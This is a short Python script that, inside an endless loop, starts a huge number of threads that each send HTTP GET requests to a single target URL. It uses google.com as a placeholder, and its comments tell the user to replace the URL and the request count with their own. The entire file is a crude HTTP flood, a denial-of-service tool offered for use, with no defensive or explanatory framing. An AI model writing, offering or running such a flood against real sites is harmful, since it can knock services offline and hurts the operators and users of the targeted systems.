import requests
import threading

while True:
	
	url = "https://www.google.com/" # replace with your URL
	num_requests = 77777777777 # replace with the number of requests you want to make

	def send_request():
		response = requests.get(url)
		if response.status_code == 200:
			print("Request successful")
		else:
			print("Request failed with status code", response.status_code)

	threads = []
	for i in range(num_requests):
		t = threading.Thread(target=send_request)
		t.start()
		threads.append(t)

	for t in threads:
		t.join()

	print("All requests complete")
